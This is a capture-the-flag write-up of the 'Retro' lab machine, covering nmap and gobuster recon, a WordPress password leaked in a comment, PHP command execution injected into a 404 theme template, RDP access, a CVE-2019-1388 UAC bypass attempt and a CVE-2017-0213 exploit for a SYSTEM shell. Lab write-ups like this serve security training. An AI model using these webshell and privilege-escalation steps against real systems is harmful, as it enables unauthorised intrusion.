| A write-up on Retro | By Herman Detwiler | 8/6/22

# Overview of Attack Chain

This Box has two different paths you can take to get innitial access. After dicovering two open ports, either can become your door into the system. Either method however (at least from what I could gather) requires finding the username wade on the website being hosted. From there two different attack paths open up:

1. Scanning through the web-site itself you can find login info and get admin access to the wordpress site, and gain a shell from injecting php into the 404 theme wordpress plugin.
2. Using the found username wade you can bypass having to log into the wp admin and simply rpd into the box using the user name wade.

From there you can find that it is an older version of windows that is vulnerable to a kernal exploit, which you can use to get root.


# Recon
prompt: *here are two distinct paths that can be taken on Retro. One requires significantly less trial and error, however, both will work. Please check writeups if you are curious regarding the two paths. An alternative version of this room is available in it's remixed version Blaster.*

## Nmap
Going to start by enumerating open ports with Nmap 
```
PORT     STATE SERVICE       REASON  VERSION
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2021-08-06T05:01:37+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Issuer: commonName=RetroWeb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-08-05T04:59:27
| Not valid after:  2022-02-04T04:59:27
| MD5:   5407 8320 ca7a 1650 d76e dc07 58a2 98f5
| SHA-1: a554 f5c1 2d2c 3a2e d097 312a 7eeb 0daa 2be5 f7c0
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQawanPWJIgrREnUqg1NstqjANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZXRyb1dlYjAeFw0yMTA4MDUwNDU5MjdaFw0yMjAyMDQwNDU5
| MjdaMBMxETAPBgNVBAMTCFJldHJvV2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEA1uReS6MpKJDO9SQ1vjO9MrMi3ckyjwCEIIbq6+XF7gMGxKzk9AV4
| 06qaVvykQDkPwXxzqpCu1nHzTeP8hmLFQF2xgoizxs+lhJ0CiQlVJqyYMz4gYZqE
| A24cCoBmFh7jlE+r3Z/+nvr1qM1w5QClQY0uRLb6nDPz1E/e+d2vEij4+M9ojg9+
| Uk7XlJ8VYxitzQd4hK+65j2HG0o2vrE9Q3P5NGZIb8BtJYQXhetZLmDE7tb2J0pI
| l6rZOBZTAh0L+ntImjTosSUtTMacWjU+1dY10CoiKA/WloQ4aRRxCrq34fkBdRNX
| RDB/OYTfKRRpMhs/sOey57gqnOSdmh0LbwIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAIju80JspY99
| 85zvjttaoihm9siU11ldiCqLN17YDwGlTbTamjz+PCVlb1Ztjh4URLIaMbZI/4HP
| ZUNmqnheLnBeYVz4ouPHRFIirfIB8bIDXGEeVOZhmJ/WNzVFpSfghASnrW2jNI/9
| /hhrnl4CuajFMLqB2Gh+/wGy0dPnadB+63BX1OVetnh1pFyUtqC9JnuQSaOf5Xmf
| NhcfCgF/gMS5fwdzQTq8id/njDRvFMaNOj4o9PxaMMhMjewtfNjTm5PVsvR8dUMm
| 4PKs2JMVgNNxasPiODWe8mQm8TN6d6J6tFhZiMKhoeCrfawwKCA359U9Wkl/Q1Od
| Wie2tv5J4oc=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-08-06T05:01:38+00:00; +1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Finding that there is a webserver and port 80, I check it in my browser and start a gobuster scan to enumerate while checking out the other open port with a service called ms-wbt-server syn-ack Microsoft Terminal services, which has a high probabilty of my way into the network. 

## Gobuster

`gobuster dir -u http://10.10.36.164 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt`

```===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.36.164
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/06 01:12:23 Starting gobuster in directory enumeration mode
===============================================================
/retro                (Status: 301) [Size: 149] [--> http://10.10.36.164/retro/]
```
## Manually viewing website

Checking out /retro I get a pretty sweet retro gaming blog being hosted, I start pulling out some potentially useful info, while throwing the /retro sub domain back into gobuster to keep some scanning going on while I work at poking around the website more.

![image](https://user-images.githubusercontent.com/83407557/128460426-35865e35-e121-4bb7-8a5b-71cb8fdd8b6e.png)

*Clicking on account Wade I am able to get some potential password leakage in a comment*

![image](https://user-images.githubusercontent.com/83407557/128460933-e2e8b439-bb26-417c-9df2-a839baadb2f8.png)

*The comment did contain a password, and we login as admin to this wordpress site*

also find Wade's company Email: darkstar@darkstar7471.com

One of the places you can upload php on a wordpress site is in their "Themes" feature, in there I find a theme that is a php file that gets loaded on any 404 error.

![image](https://user-images.githubusercontent.com/83407557/128466978-781eb853-b5f8-477a-9ef6-8db90e05c8b4.png)

I remove the stuff that isn't usefull to me and add my own spin on the 404.

![image](https://user-images.githubusercontent.com/83407557/128467501-7ab734d8-4ec4-4cf4-9ad9-5f9e459db2f3.png)

Then, by going to a page on /retro's index.php that I know (or am like 99% sure) doesn't exist, I get my much better 404 error:

![image](https://user-images.githubusercontent.com/83407557/128468198-3a6dc292-ef76-4ce1-a67f-28d36edbce10.png)

Then goal is to make the 404 actually return a reverse shell, since I know this is a windows machine let's see if I can get some more info.

```php
<?php echo `dir`;?>
```

```
Volume in drive C has no label. Volume Serial Number is 7443-948C Directory of C:\inetpub\wwwroot\retro 12/08/2019 05:02 PM
. 12/08/2019 05:02 PM
.. 05/30/2019 02:55 AM 420 index.php 05/30/2019 02:55 AM 19,935 license.txt 05/30/2019 02:55 AM 7,447 readme.html 05/30/2019 02:55 AM 6,919 wp-activate.php 12/08/2019 05:02 PM
wp-admin 05/30/2019 02:55 AM 369 wp-blog-header.php 05/30/2019 02:55 AM 2,283 wp-comments-post.php 05/30/2019 05:17 AM 2,853 wp-config-sample.php 12/08/2019 06:31 PM 2,849 wp-config.php 12/08/2019 06:31 PM
wp-content 05/30/2019 02:55 AM 3,847 wp-cron.php 12/08/2019 05:02 PM
wp-includes 05/30/2019 02:55 AM 2,502 wp-links-opml.php 05/30/2019 02:55 AM 3,306 wp-load.php 05/30/2019 02:55 AM 39,574 wp-login.php 05/30/2019 02:55 AM 8,403 wp-mail.php 05/30/2019 02:55 AM 18,962 wp-settings.php 05/30/2019 02:55 AM 31,085 wp-signup.php 05/30/2019 02:55 AM 4,764 wp-trackback.php 05/30/2019 02:55 AM 3,068 xmlrpc.php 17 File(s) 158,586 bytes 5 Dir(s) 30,425,051,136 bytes free 
```
```php
<?php echo `dir ..\`;?>
```

```
Volume in drive C has no label. Volume Serial Number is 7443-948C Directory of C:\inetpub\wwwroot 12/08/2019 05:02 PM
. 12/08/2019 05:02 PM
.. 12/08/2019 04:52 PM 703 iisstart.htm 12/08/2019 04:52 PM 99,710 iisstart.png 12/08/2019 05:02 PM
retro 2 File(s) 100,413 bytes 3 Dir(s) 30,425,051,136 bytes free 
```
**note, going back farther throws and error**

```php
<?php echo `whoami`;?>
```
```
nt authority\iusr 
```

## Reverse Shell

using msfvenom I am going to create a php rev shell

## RDP

using your rpd client of choice you can rpd with wades creds.

```bash
xfreerdp /u:wade /v:10.10.6.119
```
![image](https://user-images.githubusercontent.com/83407557/128915076-00ebc7a2-5bf7-4aad-8d8a-56a1ec92bf1c.png)

Doing so was can see users.txt on the desktop


Clicking on the shortcut on the desktop I see there is a bookmark for

https://nvd.nist.gov/vuln/detail/CVE-2019-1388

Also find a file in the recycle bin that may work for this UAC bypass technique

![image](https://user-images.githubusercontent.com/83407557/186303336-5575848a-cf42-4d8d-bef1-c59dafea9299.png)

To exploit this I first need to get it out of the trash, and have the UAC prompt come up when I try and run it. I then click the "Show information about the publisher" and a new window with an issued by link

![image](https://user-images.githubusercontent.com/83407557/186303582-be293819-3921-4468-ab12-e4ff1d345574.png)

However when I click it I see that no default browser has been set

![image](https://user-images.githubusercontent.com/83407557/186303877-7aea5e52-1b0d-4b62-9976-cbf6d6349e9a.png)


I can set one in system settings  

![image](https://user-images.githubusercontent.com/83407557/186304307-c9141ed0-63be-4807-9190-60e7129b2ff7.png)


After setting this, it still wasn't working...until I was able to get to the same menu via properties

![image](https://user-images.githubusercontent.com/83407557/186308756-b07e025b-0047-4d98-8582-b1b93dedb413.png)


It doesn't matter that this site can't be reached, what matters is that it spawned a browser running as system.

![image](https://user-images.githubusercontent.com/83407557/186309195-3392666b-ca6b-4c2c-b14b-a7810a9b249d.png)

And I can save the page

![image](https://user-images.githubusercontent.com/83407557/186309411-0f6991e4-90b5-4c30-8f7f-cd757f6af901.png)

Instead of saving I go to:

C:\Windows\System32\cmd.exe

And it seems like this vuln was maybe a rabithole.

Peas.exe had suggested this box was vulnerable to a variety of CVE's including CVE-2017-0213  

https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213

Simply running the binary will grant a system shell

![image](https://user-images.githubusercontent.com/83407557/186320647-23bbf625-5cf0-415f-9c55-e9aba9b69ff1.png)


